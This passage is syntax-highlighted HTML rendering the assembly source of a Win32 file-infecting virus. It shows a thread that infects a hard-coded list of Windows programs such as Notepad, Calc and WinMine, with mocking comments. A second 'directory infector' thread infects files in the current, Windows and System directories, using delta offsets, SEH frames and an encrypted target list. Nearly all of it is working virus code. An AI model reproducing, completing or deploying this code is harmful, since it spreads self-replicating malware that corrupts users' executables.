       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_direct</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_cFileName</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NOT_AVAILABLE</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@001</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NOT_AVAILABLE</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">                             </span><span class="sc1">;Infect it!!</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">AVAILABLE</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_direct</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">@endsz</span><span class="sc0">                                      </span><span class="sc1">;go to end of string</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">direct_loop</span><span class="sc0">                             </span><span class="sc1">;and do it again...</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">direct_end</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">direct_list</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;point names again and</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">direct_list_len</span><span class="sc0">                    </span><span class="sc1">;restore encryption</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD1SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_thread1_seh</span><span class="sc0">                     </span><span class="sc1">;host</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread1Exception</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;if we had an error we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;must restore the ESP</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaRecover1</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DeltaRecover1</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaRecover1</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_thread1_seh</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ReleaseSemaphore</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;release the semaphore</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitThread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_1_StartAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">direct_list</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;the direct action list</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                    </span><span class="sc1">;if debug is on only</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">L</span><span class="sc4">&gt;</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DGoat</span><span class="sc4">*</span><span class="sc5">.</span><span class="sc4">*&gt;</span><span class="sc0">                            </span><span class="sc1">;goat files will be</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                        </span><span class="sc1">;infected...</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">L</span><span class="sc4">&gt;</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Cdplayer.exe</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">; Like CD music?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Notepad.exe</span><span class="sc4">&gt;</span><span class="sc0">                         </span><span class="sc1">; Like to write stuff?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Wordpad.exe</span><span class="sc4">&gt;</span><span class="sc0">                         </span><span class="sc1">; Like to write better?&lt;g&gt;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Calc.exe</span><span class="sc4">&gt;</span><span class="sc0">                            </span><span class="sc1">; Like to calculate?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DrWatson.exe</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">; Fear the errors?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Extrac32.exe</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">; Like to extract?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Mplayer.exe</span><span class="sc4">&gt;</span><span class="sc0">                         </span><span class="sc1">; Like mpegs?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MsHearts.exe</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">; Like stupid games?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WinMine.exe</span><span class="sc4">&gt;</span><span class="sc0">                         </span><span class="sc1">; And more stupid games?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Sol.exe</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">; And still more stupid?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SndVol32.exe</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">; Like to adjust yer vol?</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WinHlp32.exe</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">; Are you using help?</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">; Well... TO BAD !!!! ;-)</span><span class="sc0">
</span><span class="sc5">direct_list_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">direct_list</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;€ This Thread is the directory infector thread</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">Thread_2_StartAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">tdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@Thread2Delta</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@Thread2Delta</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Thread2Delta</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD2SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Thread2Exception</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;Get the drive type. If</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetDriveTypeA</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;it is a fixed drive</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crt_dir_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;than this value = 0</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                    </span><span class="sc1">;Get Windows directory</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">wdir</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                    </span><span class="sc1">;Get System directory</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@2</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sysdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@3</span><span class="sc0">                                     </span><span class="sc1">;Get current directory</span><span class="sc0">
</span><span class="sc5">crtdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crt_dir_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;are we on a fixed disk?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">direct_to_windows</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">      </span><span class="sc1">;infect all files there</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_Directory</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">direct_to_windows</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">back_to_current_dir</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wdir</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;Change to Windows dir.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;infect 3 files there</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_Directory</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Change to System dir.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;infect 3 files there</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_Directory</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">back_to_current_dir</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crtdir</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Change back to crt dir.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD2SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_thread2_seh</span><span class="sc0">                     </span><span class="sc1">;host</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread2Exception</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;if we had an error we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;must restore the ESP</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaRecover2</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DeltaRecover2</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaRecover2</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_thread2_seh</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ReleaseSemaphore</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitThread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infections</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crt_dir_flag</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Infect_Directory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                              </span><span class="sc1">;directory scanner</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_extensions</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;restore filenames</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">file_extensions_len</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">find_first_file</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                    </span><span class="sc1">;last?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">done_directory</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">W32FD</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;find first!!</span><span class="sc0">
